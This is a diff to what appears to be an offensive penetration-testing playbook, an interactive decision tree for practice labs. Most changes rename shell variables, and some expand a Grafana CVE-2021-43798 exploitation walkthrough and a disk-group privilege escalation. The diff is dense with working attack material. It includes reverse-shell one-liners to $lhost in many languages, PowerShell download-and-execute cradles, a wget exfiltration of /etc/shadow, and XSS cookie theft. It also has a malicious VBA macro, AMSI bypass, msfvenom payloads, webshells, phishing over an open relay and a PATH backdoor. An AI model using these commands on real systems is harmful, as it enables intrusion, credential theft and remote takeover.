@@ -13,10 +13,10 @@ const nodes = {
     title: "Engagement Start",
     body: "Set your variables first — every command references them. What is your current situation?",
     cmd: `export ip=10.10.10.10
-export SUBNET=192.168.185.0/24
-export LHOST=10.10.14.x
-export LPORT=443
-export DOMAIN=domain.com
+export subnet=192.168.185.0/24
+export lhost=10.10.14.x
+export lport=443
+export domain=domain.com
 
 mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}
 cd ~/results/$ip`,
@@ -371,12 +371,12 @@ searchsploit -x <path/to/exploit>`,
     phase: "DISCOVERY",
     title: "Host Discovery",
     body: "Run all methods in parallel. ARP cannot be blocked on the local subnet — most reliable method. ICMP gets filtered constantly. Merge everything into one list.",
-    cmd: `sudo nmap -sn $SUBNET -oG scan.txt
+    cmd: `sudo nmap -sn $subnet -oG scan.txt
 grep Up scan.txt | cut -d " " -f 2 > ips_nmap.txt
 
-sudo arp-scan $SUBNET | tee arp.txt
+sudo arp-scan $subnet | tee arp.txt
 
-fping -a -g $SUBNET 2>/dev/null | tee fping.txt
+fping -a -g $subnet 2>/dev/null | tee fping.txt
 
 cat ips_nmap.txt fping.txt | sort -u | grep -v "^$" > live_hosts.txt
 cat live_hosts.txt`,
@@ -415,7 +415,7 @@ grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
 
 ipconfig /all && route print && arp -a && netstat -ano
 
-export PIVOT_SUBNET=172.16.50.0/24`,
+export pivot_subnet=172.16.50.0/24`,
     warn: "Map the full network BEFORE building your tunnel. You need the target subnet first.",
     choices: [
       { label: "Linux pivot — Ligolo-ng tunnel", next: "ligolo" },
@@ -433,14 +433,14 @@ export PIVOT_SUBNET=172.16.50.0/24`,
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Linux pivot:   ./agent -connect $LHOST:11601 -ignore-cert
-# Windows pivot: .\\agent.exe -connect $LHOST:11601 -ignore-cert
+# Linux pivot:   ./agent -connect $lhost:11601 -ignore-cert
+# Windows pivot: .\\agent.exe -connect $lhost:11601 -ignore-cert
 
 session
 [select number]
 start
 
-sudo ip route add $PIVOT_SUBNET dev ligolo
+sudo ip route add $pivot_subnet dev ligolo
 ping 172.16.50.1`,
     warn: "Add the route AFTER the tunnel starts. Without the route traffic does not flow.",
     choices: [
@@ -500,12 +500,12 @@ iptables -t nat -A POSTROUTING -j MASQUERADE`,
     body: "Chisel runs over HTTP — works when direct TCP is blocked by firewall. Server on Kali, client on pivot.",
     cmd: `./chisel server -p 8080 --reverse --socks5
 
-./chisel client $LHOST:8080 R:socks
-.\\chisel.exe client $LHOST:8080 R:socks
+./chisel client $lhost:8080 R:socks
+.\\chisel.exe client $lhost:8080 R:socks
 
 proxychains nmap -sT -p- 172.16.50.5
 
-./chisel client $LHOST:8080 R:3306:172.16.50.5:3306`,
+./chisel client $lhost:8080 R:3306:172.16.50.5:3306`,
     warn: "proxychains + nmap: always -sT. UDP and ICMP do not traverse SOCKS.",
     choices: [
       { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
@@ -517,11 +517,11 @@ proxychains nmap -sT -p- 172.16.50.5
     phase: "PIVOT",
     title: "Internal Host Discovery",
     body: "You are on a routed network now — ARP is gone. ICMP and TCP probes only. Through Ligolo scan directly. Through proxychains use -sT and drop the rate.",
-    cmd: `sudo nmap -sn $PIVOT_SUBNET -oG pivot_scan.txt
+    cmd: `sudo nmap -sn $pivot_subnet -oG pivot_scan.txt
 grep Up pivot_scan.txt | cut -d " " -f 2 > pivot_hosts.txt
-fping -a -g $PIVOT_SUBNET 2>/dev/null >> pivot_hosts.txt
+fping -a -g $pivot_subnet 2>/dev/null >> pivot_hosts.txt
 
-proxychains nmap -sT -sn $PIVOT_SUBNET --min-rate 200
+proxychains nmap -sT -sn $pivot_subnet --min-rate 200
 
 for i in $(seq 1 254); do
   ping -c1 -W1 172.16.50.$i &>/dev/null && echo "172.16.50.$i" &
@@ -652,7 +652,7 @@ hydra -L /opt/SecLists/Usernames/tomcat-usernames.txt \\
 
 # Once in — deploy malicious WAR
 msfvenom -p java/jsp_shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
+  LHOST=$lhost LPORT=$lport -f war -o shell.war
 # Upload via Manager > Deploy > WAR file
 # Access: http://$ip:8080/shell/
 
@@ -687,7 +687,7 @@ redis-cli -h $ip save
 # RCE via cron (if /var/spool/cron writable)
 redis-cli -h $ip config set dir /var/spool/cron
 redis-cli -h $ip config set dbfilename root
-redis-cli -h $ip set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\\n\\n"
+redis-cli -h $ip set payload "\\n\\n* * * * * bash -i >& /dev/tcp/$lhost/$lport 0>&1\\n\\n"
 redis-cli -h $ip save`,
     warn: "Check what user Redis runs as before choosing your attack path.",
     choices: [
@@ -708,7 +708,7 @@ impacket-mssqlclient sa:'password'@$ip -windows-auth
 # Once connected:
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
-SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
+SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
 
 # If xp_cmdshell disabled — enable it
 SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -737,12 +737,12 @@ rmg enum $ip 1099
 
 # ysoserial payload generation
 # Find the right gadget chain — try CommonsCollections first
-java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}' | \\
+java -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}' | \\
   java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit $ip 1099 CommonsCollections6 \\
-  'bash -c {bash,-i,>&,/dev/tcp/$LHOST/$LPORT,0>&1}'
+  'bash -c {bash,-i,>&,/dev/tcp/$lhost/$lport,0>&1}'
 
 # remote-method-guesser (rmg) for modern exploitation
-rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
+rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$lhost/$lport<&1'`,
     warn: "Gadget chain depends on classpath — try CommonsCollections1-7, Spring, Groovy.",
     choices: [
       { label: "Got shell via deserialization", next: "shell_upgrade" },
@@ -756,7 +756,7 @@ rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
     body: "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
     cmd: `nc -nlvp 80
 
-curl "http://$ip/page?url=http://$LHOST/"
+curl "http://$ip/page?url=http://$lhost/"
 curl "http://$ip/page?url=http://127.0.0.1/"
 curl "http://$ip/page?url=http://169.254.169.254/"
 
@@ -887,7 +887,7 @@ sudo tee /etc/shadow
 cp /etc/shadow /tmp/s && cat /tmp/s
 
 # wget (exfil as POST)
-sudo wget --post-file=/etc/shadow http://$LHOST:4444
+sudo wget --post-file=/etc/shadow http://$lhost:4444
 # Kali listener: nc -nlvp 4444
 
 # curl
@@ -930,7 +930,7 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/ba
 # mysql
 sudo mysql -e '\! /bin/bash'
 # wget
-sudo wget -O /etc/sudoers http://$LHOST/sudoers
+sudo wget -O /etc/sudoers http://$lhost/sudoers
 # rsync
 sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 # strace
@@ -949,17 +949,17 @@ sudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>
 
 # ── REVERSE SHELL ONE-LINERS ─────────────────────────
 # bash
-bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
+bash -i >& /dev/tcp/$lhost/$lport 0>&1
 # python3
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 # perl
-perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
 # nc with -e
-nc -e /bin/bash $LHOST $LPORT
+nc -e /bin/bash $lhost $lport
 # nc without -e
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f
 # php
-php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/bash -i <&3 >&3 2>&3");'
 
 # ── BIND SHELL ───────────────────────────────────────
 nc -nlvp 4444 -e /bin/bash   # target listens
@@ -1007,14 +1007,36 @@ lxc exec privesc /bin/sh
 # Inside container: cd /mnt/root && cat etc/shadow
 
 # ── DISK GROUP ───────────────────────────────────────
-# disk group = read raw disk = read any file
-df -h    # find which device / is on
-debugfs /dev/sda1
-# debugfs commands:
+# disk group = read raw disk = read any file, bypasses all permissions
+# Lab validated: Fanatastic (PG Practice)
+
+# Step 1: find which device / is on
+df -h
+# Look for: /dev/sdaX → /
+
+# Step 2: open with debugfs
+debugfs /dev/sda2   # adjust to match your device
+
+# Step 3: read anything
+# debugfs interactive commands:
 # ls /root
-# cat /root/.ssh/id_rsa
-# cat /etc/shadow
-# Can also WRITE files (dangerous)
+# cat /root/.ssh/id_rsa      ← grab root SSH key (instant root)
+# cat /etc/shadow             ← grab hashes
+# cat /root/proof.txt         ← grab flag directly
+# cat /home/user/.bash_history
+
+# Step 4: use the key
+# Copy key output to Kali → vim id_rsa → paste → :wq
+chmod 600 id_rsa
+ssh -i id_rsa root@$ip
+
+# Non-interactive read (if you need to script it):
+echo "cat /root/.ssh/id_rsa" | debugfs /dev/sda2 2>/dev/null
+echo "cat /etc/shadow" | debugfs /dev/sda2 2>/dev/null
+
+# Write files (more dangerous — use carefully):
+# debugfs -w /dev/sda2
+# then: write /tmp/myfile /etc/cron.d/backdoor
 
 # ── ADM GROUP ────────────────────────────────────────
 # adm group = read /var/log — hunt for creds
@@ -1029,7 +1051,7 @@ cat /var/log/mysql/error.log 2>/dev/null
 # Plant malicious binary ahead of system binary
 ls -la /usr/local/bin/
 echo '#!/bin/bash
-bash -i >& /dev/tcp/$LHOST/4444 0>&1' > /usr/local/bin/service
+bash -i >& /dev/tcp/$lhost/4444 0>&1' > /usr/local/bin/service
 chmod +x /usr/local/bin/service
 # Wait for root to run "service"
 
@@ -1496,10 +1518,10 @@ john --format=NT hashes.txt --wordlist=rockyou.txt
 #   T1550.003 — Pass the Ticket
 #   T1563 — Remote Service Session Hijacking
 
-## Lateral Movement — $ip → $TARGET
+## Lateral Movement — $ip → $target
 
 From: $ip ([username] @ [hostname])
-To: $TARGET ([username] @ [hostname])
+To: $target ([username] @ [hostname])
 Method: [PtH / SSH / WinRM / RDP / SMB exec]
 Technique: T1021.002 / T1550.002 (pick closest)
 
@@ -1914,7 +1936,7 @@ objdump -D target.dll | grep -i "jmp.*esp"
 
 # -- GENERATE SHELLCODE -----------------------
 msfvenom -p windows/shell_reverse_tcp \
-  LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread \
+  LHOST=$lhost LPORT=$lport EXITFUNC=thread \
   -f py -e x86/shikata_ga_nai \
   -b "\x00\x0a\x0d"    # all bad chars here
 
@@ -1938,24 +1960,24 @@ payload  = padding + eip + nop_sled + buf`,
     body: "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
     cmd: `# HTA via msfvenom
 msfvenom -p windows/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
+  LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta
 python3 -m http.server 80
-# Deliver: http://$LHOST/shell.hta
+# Deliver: http://$lhost/shell.hta
 
 # VBA macro (Word/Excel)
 # Insert > Module in VBA editor:
 Sub AutoOpen()
-  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
+  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
 End Sub
 
 # PowerShell download cradle
-IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-PowerShellTcp.ps1')
 
 # Generate PS reverse shell
 msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f ps1 > shell.ps1
+  LHOST=$lhost LPORT=$lport -f ps1 > shell.ps1
 
-nc -nlvp $LPORT`,
+nc -nlvp $lport`,
     warn: "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
     choices: [
       { label: "User executed — got shell", next: "shell_upgrade" },
@@ -1977,7 +1999,7 @@ $b.SetValue($null,$true)
 
 # Obfuscated download cradle (evades string detection)
 $c = New-Object Net.WebClient
-$c.DownloadString('http://$LHOST/tool.ps1') | IEX
+$c.DownloadString('http://$lhost/tool.ps1') | IEX
 
 # Invoke-Obfuscation (offline tool)
 Invoke-Obfuscation -ScriptPath shell.ps1 -Command TOKEN\\ALL\\1
@@ -2001,7 +2023,7 @@ Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"`,
     body: "IIS runs ASPX not PHP. If you can upload or write to the webroot, drop an ASPX shell. Default IIS path is C:\\inetpub\\wwwroot.",
     cmd: `# Generate ASPX shell
 msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
+  LHOST=$lhost LPORT=$lport -f aspx -o shell.aspx
 
 # Simple ASPX webshell (upload and browse to it)
 <%@ Page Language="C#" %>
@@ -2038,7 +2060,7 @@ psql -h $ip -U postgres -p 5432
 
 # Once connected — RCE via COPY
 psql> COPY shell FROM PROGRAM 'id';
-psql> COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"';
+psql> COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"';
 
 # Read files
 psql> COPY shell FROM '/etc/passwd';
@@ -2116,7 +2138,7 @@ proc.waitForOrKill(1000)
 println proc.text
 
 # Reverse shell via script console
-String host="$LHOST"; int port=$LPORT; String cmd2="/bin/bash"
+String host="$lhost"; int port=$lport; String cmd2="/bin/bash"
 Process p=new ProcessBuilder(cmd2).redirectErrorStream(true).start()
 Socket s=new Socket(host,port)
 [p.inputStream,s.inputStream].each { it.eachByte { s.outputStream.write(it) } }
@@ -2291,7 +2313,7 @@ SELECT '<?php system($_GET["cmd"]); ?>'
 # searchsploit mysql udf — compile raptor_udf2.c
 SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
 CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
-SELECT do_system('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1');
+SELECT do_system('bash -i >& /dev/tcp/$lhost/$lport 0>&1');
 
 # Brute force
 hydra -l root -P rockyou.txt $ip mysql`,
@@ -2362,7 +2384,7 @@ EXPN all
 
 # RCPT TO — enumerate valid users
 MAIL FROM:<test@test.com>
-RCPT TO:<admin@$DOMAIN>   # 250=exists  550=not found
+RCPT TO:<admin@$domain>   # 250=exists  550=not found
 
 # Automated user enum
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip
@@ -2375,7 +2397,7 @@ MAIL FROM:<attacker@evil.com>
 RCPT TO:<victim@external.com>   # 250 = open relay
 
 # Send phishing if open relay (client-side attacks)
-swaks --to victim@$DOMAIN --from "it@$DOMAIN" \\
+swaks --to victim@$domain --from "it@$domain" \\
   --server $ip --attach malware.hta`,
     warn: "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
     choices: [
@@ -2544,7 +2566,7 @@ Enter-PSSession $sess`,
 # %wrap; %send;
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % dtd SYSTEM "http://$LHOST/evil.dtd">
+  <!ENTITY % dtd SYSTEM "http://$lhost/evil.dtd">
   %dtd;
 ]>
 <root/>
@@ -2609,39 +2631,76 @@ echo "$ip hostname.target.com" >> /etc/hosts`,
     phase: "WEB",
     title: "Grafana (3000)",
     body: "Grafana shows up constantly on practice machines. CVE-2021-43798 is unauthenticated path traversal — grab the database and extract admin credentials from it.",
-    cmd: `nmap -p 3000 -sV $ip
-curl -s http://$ip:3000/api/health    # Version info
-curl -s http://$ip:3000/login         # Check version on login page
+    cmd: `# ── STEP 1: VERSION CHECK ─────────────────────────────
+curl -s http://$ip:3000/api/health
+# {"version":"8.3.0",...}  ← leaks exact version
+# Also visible on login page source
+# CVE-2021-43798 affects Grafana <= 8.3.0
 
-# CVE-2021-43798 — Path Traversal (Grafana < 8.3.0)
-# Read Grafana SQLite database (contains hashed passwords)
-curl --path-as-is -s "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
-
-# Or other plugins: dashboard, graph, table, text, stat, gauge
-curl --path-as-is "http://$ip:3000/public/plugins/graph/../../../../../../../../../etc/passwd"
-
-# Extract credentials from grabbed database
-sqlite3 grafana.db "SELECT login,password FROM user;"
-# Passwords are bcrypt hashed
-hashcat -m 3200 grafana_hashes.txt rockyou.txt
-john --format=bcrypt grafana_hashes.txt --wordlist=rockyou.txt
-
-# Default creds (try before exploit)
+# ── STEP 2: TRY DEFAULT CREDS FIRST ──────────────────
 # admin:admin  admin:password  admin:grafana
+# (fastest path if not patched)
 
-# After login — data source exploitation
-# Go to: Configuration > Data Sources
-# Check for database credentials stored in data sources
-# MySQL, PostgreSQL, MSSQL connections = creds for lateral movement
+# ── STEP 3: CVE-2021-43798 — PATH TRAVERSAL ──────────
+# Unauthenticated — grabs SQLite database
+curl --path-as-is -s \
+  "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
+  -o grafana.db
 
-# Grafana API enumeration (if you have creds)
+# If alertlist fails try other installed plugins:
+for plugin in dashboard graph table text stat gauge barchart timeseries; do
+  curl -s --path-as-is "http://$ip:3000/public/plugins/$plugin/../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
+  file grafana.db | grep -q SQLite && echo "SUCCESS: $plugin" && break
+done
+
+# Read any file (not just the DB):
+curl --path-as-is "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd"
+curl --path-as-is "http://$ip:3000/public/plugins/alertlist/../../../../../../../../../etc/shadow"
+
+# ── STEP 4: EXTRACT FROM DATABASE ────────────────────
+sqlite3 grafana.db "SELECT login,password,salt FROM user;"
+sqlite3 grafana.db ".tables"   # see all tables
+sqlite3 grafana.db "SELECT * FROM data_source;"   # datasource creds!
+
+# ── STEP 5: OPEN DB AND LOOK THROUGH EVERYTHING ──────
+# Don't just run one query — browse the whole database
+sqlite3 grafana.db ".tables"
+sqlite3 grafana.db "SELECT * FROM data_source;"
+# secure_json_data column contains AES-encrypted passwords
+
+# strings the raw file too — blobs sometimes visible
+strings grafana.db | grep -i "pass\|secret\|key\|token"
+
+# ── STEP 5A: DECRYPT DATASOURCE PASSWORD (DO THIS FIRST) ─
+# Datasource passwords = AES encrypted, NOT bcrypt
+# Admins often reuse their system account password here
+# Prometheus, MySQL, PostgreSQL datasources all store creds this way
+# Decrypts INSTANTLY — do this before attempting to crack anything
+
+git clone https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798.git
+cd Grafana-Decryptor-for-CVE-2021-43798
+python3 decrypt.py
+# Paste the encrypted blob from secure_json_data → get plaintext
+# Lab result: anBneWFN... → SuperSecureP@ssw0rd (sysadmin SSH cred)
+
+# ── STEP 5B: CRACK BCRYPT HASHES (last resort, slow) ─
+# User table passwords = bcrypt — often NOT valid system accounts
+# Try cracking but don't count on it
+sqlite3 grafana.db "SELECT login,password FROM user;"
+hashcat -m 3200 grafana_hashes.txt /usr/share/wordlists/rockyou.txt
+# github.com/iamaldi/grafana2hashcat — converts format for hashcat
+
+# ── STEP 6: POST-LOGIN ENUM ───────────────────────────
+# Configuration > Data Sources — check all stored creds
 curl -u admin:password http://$ip:3000/api/datasources
-curl -u admin:password http://$ip:3000/api/users`,
-    warn: "CVE-2021-43798 works on plugins that are installed. If alertlist fails try: dashboard, graph, table, text, stat, gauge, barchart, timeseries.",
+curl -u admin:password http://$ip:3000/api/users
+curl -u admin:password http://$ip:3000/api/org/users`,
+    warn: "The user table bcrypt hash is often a rabbit hole — slow to crack and may not even be a valid system account. Open the DB and look through EVERYTHING manually. The data_source table contains backend service credentials (Prometheus, MySQL, etc) encrypted with AES not bcrypt — they decrypt instantly. Admins frequently reuse their system account password as the datasource credential. Lab validated: Fanatastic (PG Practice) — user hash was useless, datasource password was the system SSH cred.",
     choices: [
-      { label: "Path traversal worked — got DB / creds", next: "creds_found" },
-      { label: "Logged in — found data source creds", next: "creds_found" },
+      { label: "Got datasource plaintext password", next: "creds_found" },
+      { label: "Cracked bcrypt hash", next: "creds_found" },
       { label: "Default creds worked", next: "creds_found" },
+      { label: "Also have Prometheus (9090) — check targets", next: "other_services" },
     ],
   },
 
@@ -3392,7 +3451,7 @@ wpscan --url http://$ip -U admin,editor \\
 # Upload via Plugins > Add New > Upload
 
 # Once confirmed RCE — reverse shell
-curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"`,
+curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'"`,
     warn: null,
     choices: [
       { label: "RCE confirmed — catch shell", next: "reverse_shell" },
@@ -3771,7 +3830,7 @@ sqlmap -u "http://$ip/page?id=1" \
 
 # 4. Verify + execute
 curl "http://$ip/shell.php?cmd=id"
-curl "http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
+curl "http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'"
 
 # -- MSSQL: xp_cmdshell -------------------
 # Enable if disabled (requires sa or sysadmin)
@@ -3858,7 +3917,7 @@ curl -v http://$ip/upload.php -X POST -F "file=@test.txt" 2>&1 | grep -i "locati
 
 # One-liner reverse shell via webshell
 # First: set up listener: sudo nc -lvnp 443
-# Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/443+0>%261'
+# Then hit: http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'
 
 # ── STEP 3: BYPASS FILTER — EXTENSION ────────────────
 # Try in order:
@@ -3929,22 +3988,22 @@ curl -X POST http://$ip/uploads/shell.php -d "cmd=id"
 sudo nc -lvnp 443
 
 # Bash reverse shell via webshell (URL encoded)
-curl "http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/443+0>%261'"
+curl "http://$ip/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/443+0>%261'"
 
 # Python reverse shell via webshell
-curl "http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
+curl "http://$ip/uploads/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("$lhost",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
 
 # Serve shell.sh and execute it
-echo 'bash -i >& /dev/tcp/$LHOST/443 0>&1' > shell.sh
+echo 'bash -i >& /dev/tcp/$lhost/443 0>&1' > shell.sh
 python3 -m http.server 8000
 # Then via webshell:
-curl "http://$ip/uploads/shell.php?cmd=curl+http://$LHOST:8000/shell.sh|bash"
+curl "http://$ip/uploads/shell.php?cmd=curl+http://$lhost:8000/shell.sh|bash"
 
 # ── STEP 8: WINDOWS ASPX / ASP SHELLS ────────────────
 # ASPX webshell — use for IIS targets
 # msfvenom generated:
 msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=443 -f aspx -o shell.aspx
+  LHOST=$lhost LPORT=443 -f aspx -o shell.aspx
 
 # Simple ASPX cmd shell (copy-paste)
 # <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
@@ -4078,8 +4137,8 @@ http://$ip/page?file=/var/log/auth.log&cmd=id`,
 $(id)
 
 # Out-of-band detection (if blind)
-; ping -c1 $LHOST
-; curl http://$LHOST/
+; ping -c1 $lhost
+; curl http://$lhost/
 
 # commix — automated, WAF-aware
 commix --url="http://$ip/page?param=" \\
@@ -4100,14 +4159,14 @@ wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\
     body: "XSS alone rarely wins. Cookie theft → session hijack → admin access is the path. Stored XSS is far more valuable than reflected.",
     cmd: `# Cookie theft
 <script>
-  fetch('http://$LHOST/?c='+btoa(document.cookie))
+  fetch('http://$lhost/?c='+btoa(document.cookie))
 </script>
 
 # Listen for cookies
 nc -nlvp 80
 
 # BeEF for advanced exploitation (if available)
-# Hook: <script src="http://$LHOST:3000/hook.js"></script>
+# Hook: <script src="http://$lhost:3000/hook.js"></script>
 
 # CSP bypass check
 curl -sv http://$ip | grep -i "content-security-policy"`,
@@ -4139,7 +4198,7 @@ searchsploit --nmap targeted.xml
 # Google: "<service> <version> exploit site:github.com"
 
 # Most Python exploits just need:
-python3 exploit.py $ip $LHOST $LPORT
+python3 exploit.py $ip $lhost $lport
 
 # Decode suspicious hex arrays before trusting them:
 python3 -c "print(b'\\x72\\x6d\\x20\\x2d\\x72\\x66...')"`,
@@ -4160,7 +4219,7 @@ python3 -c "print(b'\\x72\\x6d\\x20\\x2d\\x72\\x66...')"`,
     title: "Trigger-Dependent RCE",
     body: "Some exploits don't give you a shell immediately — they stage a payload that fires when a user action occurs. Common patterns: file written to a home directory that executes on SSH login (.bashrc, .bash_profile), cron job that picks up a dropped file, service restart, or a user opening mail. The exploit reports success but nothing happens until the trigger fires. This is expected behavior — not a failure.",
     cmd: `# Stage your listener BEFORE running the exploit
-nc -lvnp $LPORT
+nc -lvnp $lport
 
 # Apache James 2.3.2 example — payload fires on SSH login
 # After exploit runs: trigger it manually
@@ -4233,7 +4292,7 @@ unsigned char retn[] = "\\x83\\x0c\\x09\\x10"; // JMP ESP @ 0x10090c83
 # -- Step 5: replace shellcode -------------------------
 # Public exploits contain obfuscated hex payloads — always replace.
 # Bad chars are usually listed in the exploit comments.
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d"
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d"
 # Paste buf[] into shellcode[] array, keep NOP sled (\\x90 * 16) before payload
 
 # -- Step 6: off-by-one null byte fix ------------------
@@ -4466,7 +4525,7 @@ chmod +x shellcode/shell_prep.sh
 # Enter LHOST + LPORT when prompted
 
 # Start listener
-nc -nlvp $LPORT
+nc -nlvp $lport
 
 # Fire exploit
 python3 eternalblue_exploit7.py $ip shellcode/sc_x64.bin
@@ -4514,9 +4573,9 @@ impacket-ntlmrelayx -t ldap://dc01 -smb2support --no-dump
 # Wait for user to connect to a UNC path
 # Or coerce via:
 # PrinterBug:
-impacket-printerbug domain/user:pass@$ip $LHOST
+impacket-printerbug domain/user:pass@$ip $lhost
 # PetitPotam (no creds needed):
-python3 PetitPotam.py $LHOST $ip
+python3 PetitPotam.py $lhost $ip
 
 # ── STEP 4: CHECK RESULTS ────────────────────────────
 # ntlmrelayx dumps SAM hashes if relay successful
@@ -4963,47 +5022,47 @@ whoami /priv
     body: "Listener first, then execute payload. Use 443 or 80 — egress filtering blocks high ports constantly. pwncat-cs auto-upgrades TTY. If the shell dies immediately, the issue is almost always the payload encoding or a filtered port.",
     cmd: `# -- LISTENERS ----------------------------
 # pwncat-cs (best — auto TTY, file transfer built in)
-pwncat-cs -lp $LPORT
+pwncat-cs -lp $lport
 
 # nc fallback
-nc -nlvp $LPORT
+nc -nlvp $lport
 
 # -- LINUX PAYLOADS ------------------------
 # Bash (most reliable on Linux)
-bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
+bash -i >& /dev/tcp/$lhost/$lport 0>&1
 # URL encoded version (for web shells/curl):
